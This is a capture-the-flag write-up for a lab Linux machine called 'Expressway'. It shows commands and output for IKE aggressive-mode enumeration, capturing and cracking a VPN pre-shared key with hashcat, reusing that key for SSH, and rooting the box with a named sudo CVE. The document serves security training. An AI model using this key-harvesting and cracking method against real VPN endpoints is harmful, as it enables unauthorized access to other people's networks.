+++
title = 'Expressway'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

**nmap** scan.

![Expressway (Easy Linux).png](Expressway%20%28Easy%20Linux%29.png)

Only 22 with the latest SSH version - so maybe a UDP scan?

![Expressway (Easy Linux)-1.png](Expressway%20%28Easy%20Linux%29-1.png)

Port 500 is open - commonly used for the Internet Key Exchange (IKE) protocol.

From https://community.cisco.com/t5/security-knowledge-base/dead-peer-detection/ta-p/3111324: Dead Peer Detection (DPD) is a method that allows detection of unreachable IKE peers. DPD is described in informational RFC 3706: "A Traffic-Based Method of Detecting Dead Internet Key Exchange (IKE) Peers". The RFC describes the DPD negotiation procedure and two new ISAKMP NOTIFY messages. DPD requests are sent as ISAKMP R-U-THERE messages, and DPD responses as ISAKMP R-U-THERE-ACK messages.

IKE is part of the IPsec suite used to establish secure VPN tunnels.

Using `ike-scan --aggressive`:

![Expressway (Easy Linux)-2.png](Expressway%20%28Easy%20Linux%29-2.png)

```
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.242.237  Aggressive Mode Handshake returned HDR=(CKY-R=a0b0213b53d2934d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.212 seconds (4.72 hosts/sec).  1 returned handshake; 0 returned notify
```

We see there's a user `ike` with email `ike@expressway.htb`.

So, what is a PSK? A Pre-Shared Key is a secret key shared beforehand between the VPN client and server. It's used in IKE for authenticating and establishing secure VPN tunnels - both sides must have the same PSK to complete the handshake.

### How does PSK work in IKE?

- During the IKE handshake, the client and server prove knowledge of the PSK without sending it directly.
- In **Aggressive Mode**, some information is sent in cleartext - leaking identities and allowing offline attacks on the PSK.
- In **Main Mode**, the PSK is better protected, making offline cracking harder or impossible.

In the aggressive mode handshake, the handshake contains: server and client cookies, Security Association (SA) parameters, Key Exchange payload, nonce values, identity payload (leaked in aggressive mode), and a hash derived from the PSK and handshake data.

We want to crack the hash offline.

```bash
# Capture handshake data
ike-scan --aggressive 10.129.242.237 > handshake.txt
```

### Why you can't just take the "Hash(20 bytes)" from ike-scan output and crack it directly

- The "Hash(20 bytes)" shown by ike-scan is part of the IKE Aggressive Mode handshake payload - specifically the AUTH payload hash.
- It's not the raw PSK or a simple hash of the PSK. Instead, it's a keyed hash (HMAC) computed using the PSK combined with multiple handshake values (nonces, cookies, identities, DH values).
- The hash depends on the unknown PSK and other handshake data, so you can't crack that single hash value directly without the full handshake parameters and reconstructing the hash calculation.

Good resource for IKE pen testing: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/

![Expressway (Easy Linux)-4.png](Expressway%20%28Easy%20Linux%29-4.png)

```bash
ike-scan 10.129.242.237 -M -A -P --id=ike@expressway.htb

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.242.237  Aggressive Mode Handshake returned
        HDR=(CKY-R=91a72b59e48e2212)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
352bcc9ad50b0522f2055de0a3c95b31000922ee70985730b66b5e68b0fd2d001ef68f5baf86ba8f75a8de9e83c1564d3d494b49a7ed86a4cc936e5ac4e142bbf15fc31f99720157259a821682481e2c23cdf0e50c857208ae46fa850da2f3ffa925b0a755d147aa265f8e2ffb884881cb8f34a3a31f94479562c2dd93562256:29b142bab7208fd968b481feb4da5579103f4a8879c0c2f4c826df6384e40c3d74144e7c2dfb2788799d00a9abbf249b7baa0b6608094515f5b1a90d34c4295063dc67ebf775707fdcc98d10dedb658c17221518265aec4b71a1ea781f5495d2a0725dc206dd2921be22e1151bb42a6fb1d1ef7a4776f554c66fd9dc3fbd1461:91a72b59e48e2212:3d211d9881e1758b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a54131612798182f011368da715318a9d9adfc89:256f6cdb4d07f9abd7d56044a31265a9d3dae83496d1549eea47b9049324d8d7:39cf7f5fd7a5b6ac7b53ffda070d456548388fac
Ending ike-scan 1.9.6: 1 hosts scanned in 0.217 seconds (4.60 hosts/sec).  1 returned handshake; 0 returned notify
```

Note that `--id=` has to be the correct value because the hash process involves the id - in aggressive mode we were able to get the id value, so we use that.

### What is this?

- The full handshake data needed for offline PSK cracking.
- Each colon-separated field corresponds to a specific IKE handshake value:
    - `g_xr`, `g_xi`: Diffie-Hellman public keys (responder and initiator)
    - `cky_r`, `cky_i`: Cookies (responder and initiator)
    - `sai_b`: Security Association payload (binary)
    - `idir_b`: Initiator ID payload (binary)
    - `ni_b`, `nr_b`: Nonces (initiator and responder)
    - `hash_r`: The hash from the responder (the AUTH hash)

hash.txt file content:

```
352bcc9ad50b0522f2055de0a3c95b31000922ee70985730b66b5e68b0fd2d001ef68f5baf86ba8f75a8de9e83c1564d3d494b49a7ed86a4cc936e5ac4e142bbf15fc31f99720157259a821682481e2c23cdf0e50c857208ae46fa850da2f3ffa925b0a755d147aa265f8e2ffb884881cb8f34a3a31f94479562c2dd93562256:29b142bab7208fd968b481feb4da5579103f4a8879c0c2f4c826df6384e40c3d74144e7c2dfb2788799d00a9abbf249b7baa0b6608094515f5b1a90d34c4295063dc67ebf775707fdcc98d10dedb658c17221518265aec4b71a1ea781f5495d2a0725dc206dd2921be22e1151bb42a6fb1d1ef7a4776f554c66fd9dc3fbd1461:91a72b59e48e2212:3d211d9881e1758b:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a54131612798182f011368da715318a9d9adfc89:256f6cdb4d07f9abd7d56044a31265a9d3dae83496d1549eea47b9049324d8d7:39cf7f5fd7a5b6ac7b53ffda070d456548388fac
```

```bash
hashcat -m 5400 hash_psk.txt /usr/share/wordlists/rockyou.txt
# and we get a crack
hashcat -m 5400 hash_psk.txt --show
```

![Expressway (Easy Linux)-5.png](Expressway%20%28Easy%20Linux%29-5.png)

It cracks to `freakingrockstarontheroad`.

This PSK would generally be used to authenticate to the VPN/IPsec server with a VPN client - but trying it on SSH works too.

![Expressway (Easy Linux)-6.png](Expressway%20%28Easy%20Linux%29-6.png)

user.txt - `fc818b19372f2b83bc428dbb5f76fef0`

![Expressway (Easy Linux)-7.png](Expressway%20%28Easy%20Linux%29-7.png)

We see we're part of a group `proxy`:

```bash
find / -group proxy 2>&1 | grep -v "Permission denied"
```

(`2>&1` redirects stderr to stdout so we can grep it.)

We find something related to squid.

![Expressway (Easy Linux)-8.png](Expressway%20%28Easy%20Linux%29-8.png)

Squid is a high-performance caching proxy server - it stores and serves frequently requested web content from a local cache, reducing network traffic and improving response times. Squid supports HTTP, HTTPS, and FTP.

The process is running:

![Expressway (Easy Linux)-9.png](Expressway%20%28Easy%20Linux%29-9.png)

Downloaded the log and cache files in `/var/log/squid`.

Running linpeas...

```
╔══════════╣ Analyzing Htpasswd Files (limit 70)       
-rw-r--r-- 1 root root 47 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
-rw-r--r-- 1 root root 47 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
-rw-r--r-- 1 root root 117 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04           
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
-rw-r--r-- 1 root root 62 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Apr 25  2024 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30     
4105bbb04  
```

![Expressway (Easy Linux)-10.png](Expressway%20%28Easy%20Linux%29-10.png)

Stupid mistake time - I was using an older version of linpeas. You know what's new that won't get shown? New vulnerabilities.

Running a newer version of linpeas, the sudo version shows up red. Searching for an exploit on sudo version `1.9.17` finds a new vulnerability - CVE-2025-32463 (chwoot).

Running the script on the box gives us root.

![Expressway (Easy Linux)-11.png](Expressway%20%28Easy%20Linux%29-11.png)
